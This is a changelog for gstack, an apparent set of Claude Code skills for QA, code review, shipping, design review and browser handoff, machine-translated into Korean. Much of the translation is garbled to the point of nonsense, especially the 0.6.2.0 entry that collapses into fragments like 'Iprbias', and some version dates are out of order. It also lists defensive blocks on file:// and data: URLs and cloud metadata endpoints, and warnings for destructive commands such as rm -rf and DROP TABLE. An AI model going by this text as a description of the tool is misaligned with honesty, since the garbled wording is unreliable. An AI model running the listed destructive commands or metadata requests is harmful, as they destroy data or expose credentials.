- **no를 더 이상 탐색하면 위험한 URL을 탐색합니다.** `goto`, `diff`, `newtab`는 `file://`, `javascript:`, `data:` 계획 및 클라우드 메타데이터 엔드포인트 (`169.254.169.254`, `metadata.google.internal`)를 차단합니다. Localhost 및 개인 IP는 로컬 QA 테스트를 위해 아직도 허용됩니다. (#17를 닫으십시오)
- **설정 스크립트는 누락된 것을 말해줍니다.** `./setup`가 설치된 `bun`는 cryptic "command not found." 대신 설치 지침을 가진 명확한 오류를 보여줍니다 (#147를 닫습니다)
- **`/debug` `/investigate`로 이름을 변경했습니다.** Claude Code는 gstack 기술을 그림으로 표현한 `/debug` 명령을 내장했습니다. 체계적인 뿌리를 디버깅하기 때문에 워크플로우는 `/investigate`에서 생활합니다. (#190를 닫습니다)
- **쉘 사출 표면 감소.** gstack-slug 출력은 이제 `[a-zA-Z0-9._-]`에 질화되어 `eval`와 `source` 콜러를 모두 안전하게 만듭니다. (#133를 닫으십시오)
- **25개의 새로운 안전 시험.** URL 유효성 (16개의 시험) 및 경로 traversal validation (14의 시험)는 지금 막는, metadata IP 막는, 디렉토리 탈출 및 접두사 충돌 가장자리 케이스를 포함하는 전담한 단위 시험 스위트가 있습니다.

## [0.8.2] - 2026-03-19

### 추가

- **Hand off to a real Chrome when the headless browser gets stuck.** CAPTCHA, auth 벽, 또는 MFA 프롬프트를 누르십시오? `$B handoff "reason"`를 실행하고 눈에 보이는 Chrome는 모든 쿠키와 탭이 그대로 동일한 페이지에 열립니다. 문제를 해결하고 Claude를 알려 주시면, `$B resume`는 신선한 스냅샷으로 떠난 곳에 픽업합니다.
- **3 연속 실패 후 자동 손전등 힌트.** 검색 도구가 행에 3 번 실패하면 `handoff`를 사용하는 것이 좋습니다. AI를 다시 보면서 시간을 낭비하지 마십시오. CAPTCHA.
- **Handoff 기능에 대한 15 가지 새로운 테스트.** state save/restore, 고장 추적, 가장자리 케이스, cookie 및 탭 보전을 가진 가득 차있는 headless-to-headed 교류를 위한 통합 시험 플러스.

### 변경

- `recreateContext()`는 공유 `saveState()`/`restoreState()` 돕기 사용하기 위하여 재공장을 재공장을 설치했습니다. 동일한 행동, 더 적은 코드, 미래 국가 지속 기능을 위해 준비되어 있는.
- `browser.close()` 이제는 macOS의 headed 브라우저를 닫을 때 걸려는 것을 막는 5 초의 타임아웃을 가지고 있습니다.

## [0.8.1] - 2026-03-19

### 고정

- **`/qa` no 더 긴 브라우저를 백엔드 전용 변경에 사용 중지합니다.** 이전, branch만 변경된 프롬프트 템플릿, 구성 파일, 또는 서비스 논리, `/qa`는 diff를 분석할 것입니다, “no UI를 시험에,” 그리고 대신 evals를 실행하는 건의합니다. 이제 브라우저를 열고 -- 빠른 모드 연기 시험 (homepage + top 5 항법 표적)에 떨어지는 것은 no 특정 페이지가 diff에서 확인됩니다.

## [0.8.0] - 2026-03-19. 멀티AI 두 번째 의견

**`/codex`. 완전 다른 AI에서 독립적인 두번째 의견을 얻으십시오.**

`/codex review`는 OpenAI의 Codex CLI를 diff에 대하여 /fail 문을 운영하고 있습니다. Codex가 중요한 문제점을 찾아봅시다면 실패합니다. `/codex challenge`는 adversarial를 갑니다: 당신의 코드를 생산에 실패하는 방법을 찾아내기 위하여, 공격자와 chaos 엔지니어 같이 생각할 것입니다. `/codex <anything>`는 `/codex <anything>`가 당신의 contuity에 관하여 대화를, 이렇게 하면 됩니다.

`/review` (Claude)와 `/codex review` 모두 실행될 때, 당신은 overlap를 찾아내고 각 AI에 유일하게 있는 교차 모형 분석 결과를 얻습니다. 체계를 신뢰할 때 intuition를 건설하십시오.

**모든 곳에 통합.** `/review` 끝 후에, 그것은 Codex 두 번째 의견을 제안합니다. `/ship` 도중, 당신은 밀어하기 전에 선택 문으로 Codex 검토를 실행할 수 있습니다. `/plan-eng-review`에서, Codex는 기술설계 검토가 시작되기 전에 계획을 자주적으로 할 수 있습니다. 모든 Codex 결과는 검토 Readiness 대시보드에서 보여줍니다.

**이 릴리스에서 :** Proactive Skill 제안. gstack 이제 개발 단계가 무엇인지 알려 주시면 올바른 기술을 제안할 수 있습니다. 그것을 좋아하지 않습니까? "stop suggesting"라고 말하며 세션 전체에 기억하십시오.

## [0.7.4] - 2026-03-18

### 변경

- **`/qa`와 `/design-review`는 이제는 어떤 변경으로 할 것을 요구합니다** 시작을 거부하는 대신. 작업 나무가 더러운 경우, 당신은 세 가지 옵션으로 상호 작용하는 프롬프트를 얻을: commit 당신의 변경, 그들을 돌리거나, 복종. No 더 많은 암호화 "ERROR: 작업 나무는 더러운" 텍스트의 벽에 의해 후.

## [0.7.3] - 2026-03-18

### 추가

- **안전 난간 하나 개의 명령으로 켜질 수 있습니다.** "주의"또는 "안전 모드"라고 말하며 `/careful`는 모든 파괴적인 명령을 전전으로 경고합니다. `rm -rf`, `DROP TABLE`, force-push, `kubectl delete`, 그리고 더 많은 것. 당신은 각 경고를 과도하게 할 수 있습니다. 일반적인 건축은 청소합니다 (`rm -rf node_modules`, `dist`, `.next`)는 백색 목록으로 만들어집니다.
- **`/freeze`로 한 폴더에 잠금을 편집합니다.** 무언가를 부수고 Claude를 "fix"와 관련 코드로 원하지 않습니까? `/freeze`는 당신이 선택하는 디렉토리 밖에서 모든 파일 편집을 차단합니다. 하드 블록은 경고가 아닙니다. `/unfreeze`를 실행하여 세션을 종료하지 않고 제한을 제거하십시오.
- **`/guard`는 한 번에 모두 활성화합니다.** prod 또는 live system을 터치할 때 최대 안전에 대한 하나의 명령. 디렉토리 복사 제한과 명령 경고를 파괴.
- **`/debug` 이제 자동 냉동은 모듈에 debugged 편집합니다.** 루트 원인 hypothesis를 형성 한 후, `/debug`는 가장 좁은 영향을받는 디렉토리에 편집합니다. No 더 많은 실수 "fixes"는 디버깅 중에 관련 코드를 비난합니다.
- **당신은 지금 당신이 사용하는 기술과 방법을 자주 볼 수 있습니다.** 각 기술 invocation는 `~/.gstack/analytics/skill-usage.jsonl`에 현지으로 기록됩니다. 당신의 최고 기술을, per-repo 고장 보고하는 `bun run analytics`를 실행하고, 얼마나 자주 안전 걸이는 실제로 무언가를 붙잡습니다. 당신의 기계에 자료 체재.
- **이제 Weekly retros는 기술 사용량을 포함합니다.** `/retro`는 평소 commit 분석과 메트릭스와 함께 복고창에서 사용한 기술을 보여줍니다.

## [0.7.2] - 2026-03-18

### 고정

- `/retro` 날짜는 현재 시간 대신 자정에 맞출 수 있습니다. 9pm no에서 `/retro`를 실행하면 더 이상 시작 날짜의 아침을 떨어뜨릴 수 있습니다. 당신은 전체 달력 일을 얻을 수 있습니다.
- `/retro` 타임스탬프는 이제 하드 코딩 태평양 시간 대신 현지 시간대를 사용합니다. US-West coast 외부 사용자는 자신의토그램, 세션 감지 및 streak 추적에서 현지 시간을 수정합니다.

## [0.7.1] - 2026-03-19

### 추가

- **gstack 이제 자연의 순간에 기술을 제안한다.** 슬래시 명령을 알 필요가 없습니다. 그냥 당신이 무엇을하고 있는지 이야기. 아이디어를 뇌하수? gstack는 `/office-hours`을 제안합니다. 끊어지는 것? 그것은 `/debug`를 제안합니다. 배치하기 위하여 준비? 그것은 `/ship`를 제안합니다. 각 워크플로 기술은 현재 순간이 맞을 때 불에 유동성 방아쇠가 있습니다.
- **Lifecycle 지도.** gstack의 루트 기술 설명은 지금 개발자 워크플로 가이드 맵핑 12 단계 (brainstorm → 계획 → 검토 → 코드 → 디버그 → 테스트 → 배 → 문서 → 복고풍)를 올바른 기술에 포함합니다. Claude는 각 세션에서 이것을 참조하십시오.
- **자연 언어와 Opt-out.** 프로액티브 제안이 너무 공격적이라면 "스톱 제안"이라고 말합니다. gstack 세션을 통해 기억합니다. "비활성 다시"를 다시 재 활성화하십시오.
- **11 여행 단계 E2E 테스트.** 각 시험은 현실적인 프로젝트 컨텍스트 (plan.md, 오류 로그, git history, code)를 가진 개발자 라이프사이클에서 순간을 시뮬레이션하고 자연어로 갖는 옳은 기술 불을 혼자 나눕니다. 11/11 패스.
- **Trigger 구문 검증.** 정적 테스트는 모든 워크플로우 기술을 "사용할 때"및 "보호적으로 제안" 문구를 확인합니다. 무료 회귀를 잡아.

### 고정

- `/debug`와 `/office-hours`는 자연 언어로 완전하게 보이지 않았습니다. no는 모두 구문을 방아쇠로 덮습니다. 이제 모두 완전 민감 + 부동 방아쇠가 있습니다.

## [0.7.0] - 2026-03-18. YC 사무실 시간

**`/office-hours`. 코드를 작성하기 전에 YC 파트너와 함께 앉아.**

두 가지 모드. 시작을 구축하는 경우, YC가 제품을 평가하는 방법에서 증류되는 6 개의 질문을 얻을: 수요 현실, 상태 quo, desperate specificity, 좁은 쐐기, 관측 & 놀람, 그리고 미래에 맞는. 당신은 측면 프로젝트에 해킹, 코드 학습, 또는 해커톤에서, 당신은 당신의 아이디어의 가장 멋진 버전을 찾을 수 있도록하는 열성 뇌하수우 파트너를 얻을.

두 모드는 `/plan-ceo-review`과 `/plan-eng-review`로 직접 공급하는 디자인 doc을 작성합니다. 세션 후, 기술이 어떻게 생각했는지 다시 반영합니다. 특정 관측, 일반 칭찬이 아닙니다.

**`/debug`. 루트 원인을 찾아, symptom.**

뭔가 깨어나면 왜 알고 있지 않습니다. `/debug`는 체계적인 디버거입니다. 그것은 철 법을 따릅니다: no는 루트 원인 조사를 먼저 고쳤습니다. 데이터 흐름을 추적하고 알려진 버그 패턴 (레이스 조건, nil propagation, stale cache, config drift)과 테스트는 한 번에 한 번씩 증가합니다. 3 가지 수정이 실패하면 thrashing 대신 아키텍처를 중지하고 질문하십시오.

## [0.6.4.1] - 2026-03-18

### 추가

- **지금 자연 언어를 통해 발견 할 수 있습니다.** 이제 명시된 트리거 구문이 누락 된 모든 12 기술. "이 배포"와 Claude는 `/ship`를 찾아 "내 diff"를 확인하고 `/review`를 찾습니다. Anthropic의 가장 모범 사례는 다음과 같습니다. "설명 필드는 요약이 아닙니다. 트리거 할 때입니다."

## [0.6.4.0] - 2026-03-17

### 추가

- **`/plan-design-review`는 이제 대화형입니다. 요금 0-10, 계획을 수정합니다.** 대신 문자 등급으로 보고서를 생성하는 대신 디자이너는 이제 CEO와 Eng review와 같은 작업을 수행합니다. 각 디자인 치수 0-10의 비율은 10처럼 보이고, 그 다음 거기에 얻을 계획을 편집합니다. 디자인 선택 당 AskUserQuestion. 출력은 더 나은 계획이며, 계획에 대한 문서가 아닙니다.
- **CEO 디자이너에 대한 리뷰가 있습니다.** `/plan-ceo-review`가 계획중인 UI 범위를 검출할 때, 그것은 정보 건축, 상호 작용 국가 적용, AI 슬로프 위험 및 응답한 의도를 덮는 디자인 & UX 단면도 (Section 11)를 활성화합니다. 깊은 디자인 일을 위해, 그것은 `/plan-design-review`를 추천합니다.
- **14의 15의 기술에는 지금 가득 차있는 시험 적용이 있습니다 (E2E + LLM-judge + validation).** 추가 LLM-judge quality eval for 10 skills that was missing them: ship, retro, qa-only, plan-ceo-review, plan-eng-review, plan-design-review, design-review, design-consultation, document-release, gstack-upgrade. gstack-upgrade를 위한 실제 E2E 테스트 추가 (`.todo`). 명령 검증에 추가된 디자인 선택.
- **Bisect commit 작풍.** CLAUDE.md는 이제 각 commit를 단일 논리적인 변화로 요구합니다. rewrites에서 분리되는 이름을, 시험 실시에서 분리되는 시험 인프라를 지명하십시오.

### 변경

- `/qa-design-review`는 `/design-review`로 이름을 딴다. "qa-" 접두사는 `/plan-design-review`가 계획 모드임을 혼란스럽다. 모든 22 파일에서 업데이트됨.

## [0.6.3.0] - 2026-03-17

### 추가

- **PR 터치 frontend 코드는 이제 디자인 리뷰를 자동으로 가져옵니다.** `/review` and `/ship` apply a 20-item design checklist against changed CSS, HTML, JSX, and view files. Catches AI slop patterns (purple gradients, 3-column icon grids, generic hero copy), typography issues (body text < 16px, blacklisted fonts), accessibility gaps (`outline: none`), and `!important` abuse. Mechanical CSS fixes are auto-applied; design judgment calls ask you first.
- **`gstack-diff-scope` 분기에 변경된 내용을 분류합니다.** 실행 `source <(gstack-diff-scope main)` 그리고 `SCOPE_FRONTEND=true/false`, `SCOPE_BACKEND`, `SCOPE_PROMPTS`, `SCOPE_TESTS`, `SCOPE_DOCS`, `SCOPE_CONFIG`를 얻습니다. 디자인 검토는 배경 전용 PR에 침묵하게 건너뛰기 위하여 그것을 이용합니다. 배 전 빛은 정면 파일이 만지기 때 디자인 검토를 추천하는 것을 사용합니다.
- **Design review는 Review Readiness Dashboard에서 보여줍니다.** 대시보드는 이제 "LITE"(code-level, /review 및 /ship)과 "FULL"(/plan-design-review를 통해 시청 감사)를 구별합니다. 디자인 리뷰 항목으로 두 번 표시하십시오.
- **E2E eval for design review 검출.** 플랜트 CSS/HTML 7개의 알려진 반대로 patterns (Papyrus 글꼴, 14px 몸 원본, `outline: none`, `!important`, 자주색 기온변화도, 일반적인 영웅 복사, 3-column 특징 격자). 이 비율은 `/review` 최소 4의 7를 붙잡습니다.

## [0.6.2.0] - 2026-03-17

### 추가

- **계획 리뷰는 이제 세계에서 가장 좋아 보인다.** `/plan-ceo-review`는 Bezos (편도 문, 일 1개의 프록시 무균), 그로브 (paranoid 스캐닝), Munger (inversion), Horowitz (wartime 인식), Chesky/Graham (확장 형태) 및 Altman (대량 불소)에서 14의 인지적인 본을 적용합니다. `/plan-eng-review`는 Larson (팀 상태 진단), McKinley (default에 의해 보링), Brooks (essential 대 사고 복잡성), Beck (변경 쉬운 것), Majors (생산에 있는 당신의 코드를 소유하십시오), 및 구글 SRE (오류 예산)에 의하여 덮습니다. `/plan-design-review`는 Rams (subtraction default), 노먼 (time-horizon 디자인), Zhuproto (iprbia)를 위한 12의 본을, Iprbias (이후한 여행), Iprbias (이), Iprbias.
- **Latent 공간 활성화, 체크리스트가 아닙니다.** 인지 패턴 이름 드롭 프레임 워크와 사람들은 LLM 는 실제로 어떻게 생각하는지 깊은 지식을 그릴. 지시는 "이를 내부화하지 않습니다. 각 리뷰는 정품 관점 교대를 만들기, 더 긴 체크리스트가 아닙니다.

## [0.6.1.0] - 2026-03-17

### 추가

- **E2E와 LLM-judge 시험은 이제 변경된 것을 실행합니다.** 각 시험은 소스 파일이 달려있는 선언. `bun run test:e2e`를 실행하면 diff를 확인하고 의존성이 보이지 않는 테스트를 건너 뛰십시오. branch는 `/retro`만 변경하면 31 대신 2개의 테스트를 실행합니다. `bun run test:e2e:all`를 사용하여 모든 것을 강제로 사용하십시오.
- **`bun run eval:select` 테스트가 실행될 미리보기.** API 크레딧을 지출하기 전에 diff 트리거를 테스트하는 것을 정확히 확인하십시오. 스크립트 및 `--base <branch>`를 위해 `--json`를 지원하여 기본 branch을 과도하게하십시오.
- **Completeness guardrail는 잊어 버린 시험 항목에 붙잡습니다.** 무료 단위 테스트는 E2E에서 `testName`와 LLM-judge 시험 파일에 있는 모든 TOUCHFILES 지도에 있는 대응 입장이 있는다. 항목이 없는 새로운 시험은 `bun test` 즉각 실패하지 않는. no 침묵하는 항상 뛰기 격실.

### 변경

- `test:evals`와 `test:e2e`는 diff (와: all-or-nothing)를 기준으로 자동 선택했습니다
- 새로운 `test:evals:all` 및 `test:e2e:all` 스크립트를 명시된 풀 실행

## 0.6.1. 2026-03-17. 호수를 끓는

gstack 기술이 이제 **완료 원리**를 따르는 AI가 근접한 마진 비용을 만들 때 항상 완전한 구현을 추천합니다. No는 선택권 A가 70의 줄 더 코드일 때 가치의 90%이기 때문에 더 많은 "Choose B를 더 많은 것.

철학을 읽으십시오: https://garryslist.org/posts/boil-the-ocean

- **스코링 완료**: 모든 AskUserQuestion 선택권은 지금 완료를 보여줍니다
  점수 (1-10), 완전한 해결책을 향해 분기
- **이중 시간 추정**: 노력은 인간 팀과 CC+gstack 시간을 둘 다 보여주었습니다
  (예: "human: ~2주/CC: ~1시간") 작업 유형 압축 참조 테이블
- **반대로 단락 예제**: 콘크리트 "동의하지 마십시오" 갤러리에서 preamble 그래서
  원칙은 추상하지 않습니다.
- **첫 번째 시간 onboarding**: 새로운 사용자는 1회 소개 연결을 참조하십시오
  essay, 브라우저에서 열기
- **완전한 격차를 검토하십시오**: `/review` 이제는 단축키 구현을 플래그로 합니다.
  완전한 버전 비용 <30 min CC 시간
- **호수 점수**: CEO 및 Eng review 완료 요약은 얼마나 많은 권고를 보여줍니다
  완전한 옵션을 선택 vs shortcuts
- **CEO + Eng 검토 듀얼 타임**: 임시 방해, 노력 추정, 및 기쁨
  모든 기회는 인간과 CC 시간 가늠자를 보여줍니다

## 0.6.0.1. 2026-03-17

- **`/gstack-upgrade` 이제 stale 공급 업체 사본을 자동으로 잡아.** 글로벌 gstack가 현재까지 시작되지만 프로젝트의 공급 업체 사본은 뒤로, `/gstack-upgrade`는 잡화와 동기화를 감지합니다. No는 수동으로 "did we 공급 업체를."라고 묻습니다. 그냥 알려서 업데이트 할 수 있습니다.
- **업그레이드 동기화는 더 안전합니다.** `./setup`가 공급 업체 사본을 동기화하면서 실패한 경우 gstack는 부서지는 설치를 떠나지 않는 대신 백업에서 이전 버전을 복원합니다.

### 기여자

- `gstack-upgrade/SKILL.md.tmpl`의 독립 사용법 단면도는 지금 두드리는 탐지/sync bash 구획 대신 Step 2와 4.5 (DRY)를 참조합니다. 1개의 새로운 버전 comparison bash 구획을 추가했습니다.
- 이제 독립 모드에서 업데이트 체크가 무방합니다. 전단 패턴 (글로벌 경로 → 로컬 경로 → `|| true`).

## 0.6.0. 2026-03-17

- **100% 시험 적용은 중대한 vibe 기호화에 열쇠입니다.** gstack 이제 프로젝트가 하나가 없는 경우 스크래치에서 시체 테스트 프레임워크를 시체합니다. 런타임을 감지하고, 최고의 프레임워크를 조사하고, 설치하고, 실제 코드를 위한 3-5개의 실제 테스트를 작성하고, CI/CD (GitHub Actions)를 설정하고 TESTING.md를 생성하고, CLAUDE.md에 대한 테스트 문화 지침을 추가합니다. 자연적으로 테스트한 후 Claude Code 세션마다 Claude Code 세션이 표시됩니다.
- **모든 버그 수정은 이제 회귀 테스트를 가져옵니다.** `/qa` 버그를 수정하고, 8e.5 단계는 자동적으로 파산된 정확한 시나리오를 잡는 회귀 시험을 생성합니다. 시험은 QA 보고서에 뒤를 추적하는 가득 차있는 attribution를 포함합니다. 자동 증가 파일 이름은 세션의 맞은편에 충돌을 방지합니다.
- **신뢰를 가진 배. 적용 감사는 시험되고 무엇 아닙니다 보여줍니다.** `/ship` 단계 3.4는 diff에서 코드 경로 지도를 건설하고, 대응 시험을 검색하고, 품질 별 (★★★ = 가장자리 케이스 + 오류, ★★ = 행복한 경로, ★ = 연기 시험)와 ASCII 적용 다이어그램을 생성합니다. 개스는 자동 생성을 얻습니다. PR 몸은 "시험을 보여줍니다: 42 → 47 (+5 새로운)".
- **당신의 복고풍은 건강을 추적합니다.** `/retro`는 이제 총 시험 파일을 보여, 시험은 이 기간을 추가했습니다, 회귀 시험은, 및 동향 deltas를 붙듭니다. 시험 비율이 20% 이하 떨어지면, 성장 지역으로 발사합니다.
- **디자인 리뷰는 회귀 테스트를 생성합니다.** `/qa-design-review` Phase 8e.5 CSS-only fixes (디자인 감사를 재 실행해서 붙잡습니다)를 건너서 시험하고, JavaScript 동작 변화에 대한 시험은 끊긴 하락 또는 생기 실패 같이 씁니다.

### 기여자

- `generateTestBootstrap()` 해결사 `gen-skill-docs.ts` (~155 라인)에 추가. RESOLVERS 지도에서 `{{TEST_BOOTSTRAP}}`로 등록. qa, ship (Step 2.5), qa-design-review 템플릿에 삽입.
- 8e.5 회귀 테스트 생성은 `qa/SKILL.md.tmpl` (46 라인)과 CSS-aware 변형을 `qa-design-review/SKILL.md.tmpl` (12 선)에 추가했습니다. 규칙 13은 새로운 테스트 파일을 만들 수 있도록 수정되었습니다.
- 단계 3.4 시험 적용 감사는 질 득점 루비 및 ASCII 도표 체재로 `ship/SKILL.md.tmpl` (88의 선)에 추가했습니다.
- `retro/SKILL.md.tmpl`에 추가된 건강 추적을 시험하십시오: 3개의 새로운 자료 수집 명령, 미터 줄, narrative 단면도, JSON schema 분야.
- `qa-only/SKILL.md.tmpl`는 no 테스트 프레임워크가 감지될 때 권고 사항을 가져옵니다.
- `qa-report-template.md`는 멸균 시험 specs를 가진 회귀 시험 단면도를 얻습니다.
- ARCHITECTURE.md 위주자 테이블 `{{TEST_BOOTSTRAP}}`와 `{{REVIEW_DASHBOARD}}`로 업데이트.
- 웹검색 qa, ship, qa-design-review에 대한 허용툴 추가.
- 26 새로운 검증 테스트, 2 새로운 E2E evals (bootstrap + 적용 감사).
- 2 새로운 P3 TODOs: CI/CD 비 GitHub 공급자를 위해, 자동 업그레이드 약한 시험.

## 0.5.4. 2026-03-17

- **엔지니어링 리뷰는 항상 전체 리뷰입니다.** `/plan-eng-review` no 더 긴 "큰 변화"와 "작은 변화"모드 사이에서 선택할 것을 요구합니다. 각 계획은 가득 차있는 상호 작용하는 연습 (아치지, 코드 질, 시험, 성과)를 가져옵니다. 범위 감소는 단지 복잡성 체크 실제로 방아쇠가 있을 때 건의됩니다. 서 있는 메뉴 선택권으로 아닙니다.
- **한 번에 리뷰에 대해 묻는 배가 답했습니다.** `/ship`가 누락된 리뷰에 대해 묻고, "ship anyway"또는 "notrelated,"라고 해서 결정은 지점에 저장됩니다. No 더 많은 것은 사전 착륙 후 `/ship`를 다시 실행합니다.

### 기여자

- SMALL_CHANGE / BIG_CHANGE / SCOPE_REDUCTION 메뉴 `plan-eng-review/SKILL.md.tmpl`에서 제거했습니다. Scope 감소는 이제 메뉴 품목보다는 복잡성 검사로 인한) 유동성 (아무리적 검사로 인한)입니다.
- `ship/SKILL.md.tmpl`에 대한 검토 게이트 오버라이드 지속성을 추가했습니다. `ship-review-override` 항목에 `$BRANCH-reviews.jsonl`를 쓰고 `/ship`는 문을 건너뛰기 시작합니다.
- 업데이트 2 E2E 테스트는 새로운 흐름과 일치하도록 신속한.

## 0.5.3. 2026-03-17

- **항상 통제합니다. 큰 꿈을 때조차.** `/plan-ceo-review` 이제는 개인의 결정으로 모든 범위 확장을 제시합니다. EXPANSION 모드는 열렬히 권고하지만, yes 또는 no를 각 아이디어로 말한다. No 더 많은 "제가 야생을 갔다 5 내가 요구하지 않은 기능 추가"
- **새로운 형태: SELECTIVE EXPANSION.** 기본으로 현재 범위를 파악하지만 다른 것이 가능할 수 있는지 확인하십시오. 에이전트 표면 확장 기회는 중립 권고와 함께 하나씩. 당신은 체리 핑크 한 번의 가치가 있습니다. 당신이 rigor를 원하지만 인접한 개선에 의해 유혹 할 기존 기능에 완벽합니다.
- **CEO 리뷰 비전은 저장되지 않습니다.** 확장 아이디어, 벚꽃 펑크 결정, 그리고 10x 비전은 이제 구조 설계 문서로 `~/.gstack/projects/{repo}/ceo-plans/`에 지속됩니다. Stale 계획은 자동으로 아카이브를 얻을 수 있습니다. 비전이 탁월한 경우, 팀의 repo에서 `docs/designs/`로 홍보 할 수 있습니다.

- **더 똑똑한 배 문.** `/ship` no는 CEO와 관련이 없는 디자인 리뷰에 관하여 더 오래 나갑니다. Eng Review는 단지 필수 문 (이고 `gstack-config set skip_eng_review true`도)와 무능할 수 있습니다. CEO 검토는 큰 제품 변화를 위해 추천됩니다; UI 일을 위한 디자인 검토. 대쉬보드는 아직도 3개를 보여줍니다. 그것은 다만 선택한 것을 막지 않습니다.

### 기여자

- SELECTIVE EXPANSION 형태를 `plan-ceo-review/SKILL.md.tmpl`로 체리피닉 식, 중립 권고 자세, HOLD SCOPE 기본으로 추가했습니다.
- Rewrote EXPANSION 모드의 단계 0D는 선택적 식이 포함. 분리 된 제안으로 증류 비전, AskUserQuestion로 각각 제시.
- CEO 플랜 persistence (0D-POST 단계): YAML frontmatter (`status: ACTIVE/ARCHIVED/PROMOTED`), 범위 결정 테이블, archival 흐름을 가진 구조상된 감속.
- `docs/designs` 프로모션 단계가 검토 로그 후 추가되었습니다.
- 모드 Quick Reference Table은 4개의 열으로 확장되었습니다.
- 검토 준비 대시보드 : 필요한 Eng Review (`skip_eng_review` config를 통해 overridable), CEO/Design 에이전트 판단에 대한 옵션.
- 새로운 테스트: CEO 검토 모드 검증 (4 모드, 지속, 승진), SELECTIVE EXPANSION E2E 테스트.

## 0.5.2. 2026-03-17

- **디자인 컨설턴트는 이제 창조적 인 위험을 갖게됩니다.** `/design-consultation`는 안전, 일관성 체계를 제안하지 않습니다. 그것은 SAFE CHOICES (category baseline) 대를 아래로 끊습니다. RISKS (당신의 제품이 밖으로 나타낸 곳에). 당신은 틈에 규칙을 선택합니다. 모든 위험은 왜 그것 작동하고 그것 비용에 대하 합리적으로 옵니다.
- **선택하기 전에 풍경을보십시오.** 연구로 선택하면 에이전트는 스크린 샷 및 접근성 트리 분석으로 공간의 실제 사이트를 찾습니다. 웹 검색 결과가 아닙니다. 디자인 결정 전에 어떤 것이 있는지 알아보십시오.
- **제품처럼 보이는 미리보기 페이지.** 미리보기 페이지는 현실적인 제품 모의 기능을 렌더링합니다. 사이드바 나브와 데이터 테이블, 영웅 섹션, 설정 페이지와 마케팅 페이지와 함께 대쉬보드를 제공합니다. 단지 글꼴 견본과 색상 팔레트는 아닙니다.

## 0.5.1. 2026-03-17
- **당신이 배의 앞에 서 있는 곳에 알고.** 각 `/plan-ceo-review`, `/plan-eng-review`, `/plan-design-review`는 이제 검토 추적기에 결과를 기록합니다. 각 검토의 끝에, 당신은 그들이 ran, 그리고 그들이 청결하다는 것을, 그 때, 리뷰가 행해지는 **리뷰 Readiness 대시보드**를 보여주는 SHIP 또는 NOT READY를 보여줍니다. 명확한 CLEARED TO SHIP 또는 NOT READY verdict로.
- **`/ship`는 PR를 만들기 전에 리뷰를 확인합니다.** Pre-flight는 이제 대시보드를 읽고 리뷰가 누락될 때 계속하려면 요청합니다. 정보 만. 차단하지 않으나, 건너뛰는 것을 알 수 있습니다.
- **복사 - 파스트에 대한 덜 한 가지.** SLUG 계산 (git remote에서 `owner-repo`를 계산하는 opaque sed 파이프라인)은 이제 공유 `bin/gstack-slug` 헬퍼입니다. `source <(gstack-slug)`로 대체된 템플릿의 모든 14 인라인 복사. 형식이 변경되면 한 번 수정하십시오.
- **스크린 샷은 QA 중 눈에 띄며 세션을 검색합니다.** gstack 스크린 샷을 찍을 때, 그들은 이제 출력에 클릭 가능한 이미지 요소로 표시됩니다. no 더 보이지 않는 `/tmp/browse-screenshot.png` 경로는 볼 수 없습니다. `/qa`, `/qa-only`, `/plan-design-review`, `/qa-design-review`, `/browse` 및 `/gstack`에서 작동합니다.

### 기여자

- `{{REVIEW_DASHBOARD}}`의 해결자를 `gen-skill-docs.ts`로 추가했습니다. 4개의 템플릿으로 공유된 대쉬보드 리더(검토 기술 + 배)를 공유했습니다.
- 단위 테스트를 가진 `bin/gstack-slug` 돕는 사람 (5 선 bash)를 추가하십시오. 출력 `SLUG=`와 `BRANCH=` 선은 `/`를 `-`에, sanitizes `/`를 출력합니다.
- 새로운 TODOs: 스마트 리뷰 리버스 엑시비션 검출 (P3), `/merge` 리뷰-gated PR merge (P2).

## 0.5.0. 2026-03-16

- **귀하의 사이트는 단지 디자인 리뷰를 가지고.** `/plan-design-review`는 당신의 사이트를 열고 고위 제품 디자이너 같이 그것을 평가합니다. 전기, 간격, hierarchy, 색깔, 대답하는, 상호 작용 및 AI 사면 탐지. 종류, 이중 헤드 라인 "Design Score" + "AI 사면 점수", 그리고 pull 펀치가 아닌 구조상 첫번째 인상을 얻으십시오.
- **그것은 그것을 찾을 수 있습니다, 너무.** `/qa-design-review`는 동일한 디자이너의 눈 감사를 달고, 그 후에 원자 `style(design):`가 붙은 변화를 위해 조정된 엄격한 각자 통제 heuristic에 있는 디자인 문제점을 해결합니다. CSS는 default에 의해, 스티링 변화에 대한 엄격한 각자 통제 heuristic 조정과 더불어 default에 의해, 안전합니다.
- **실제 설계 시스템을 알고 있습니다.** 두 기술 모두는 JS를 통해 당신의 살아있는 위치의 글꼴, 색깔, 두는 가늠자 및 간격 본을 추출합니다. 그 후에 `DESIGN.md` 기본으로 inferred 체계를 저장하기 위하여 제안하십시오. 마지막으로 당신이 실제로 사용하는 많은 글꼴을 알고 있습니다.
- **AI 슬로프 검출은 헤드 라인 미터입니다.** 각 보고서는 두 개의 점수로 열립니다. 디자인 점수와 AI 슬로프 점수. AI 슬로프 체크리스트는 가장 인정할만한 AI-generated 패턴을 잡습니다. 3-column 기능 그리드, 보라색 그리스, 장식 blobs, 이모티콘 총알, 일반 영웅 복사.
- **디자인 회귀 추적.** 보고서는 `design-baseline.json`를 작성합니다. 다음 자동 비교를 실행하십시오: 카테고리 등급 델타, 새로운 발견, 해결된 발견. 디자인 점수를 시계는 시간 이상 향상.
- **80-item 디자인 감사 검사 목록** 10개 카테고리의 맞은편에: 시각적인 hierarchy, typography, color/contrast, 간격/layout, 상호 작용 국가, 대답, 동의, content/microcopy, AI 슬로프 및 성과 디자인. Vercel의 100+ 규칙, Anthropic의 frontend 디자인 기술 및 6개의 다른 디자인 기구에서 증류하는.

### 기여자

- `{{DESIGN_METHODOLOGY}}`의 해결자는 `gen-skill-docs.ts`로 추가했습니다. `{{QA_METHODOLOGY}}` 패턴을 따르는 `/plan-design-review`와 `/qa-design-review` 템플릿 모두에 주입된 디자인 감사 방법론을 공유했습니다.
- 긴 범위의 비전 문서에 대한 로컬 계획 디렉토리로 `~/.gstack-dev/plans/` 추가 (확인되지 않음). CLAUDE.md 및 TODOS.md 업데이트.
- `/setup-design-md` 에 TODOS.md (P2) 스크래치에서 DESIGN.md 생성을 위한 `/setup-design-md`를 추가했습니다.

## 0.4.5. 2026-03-16

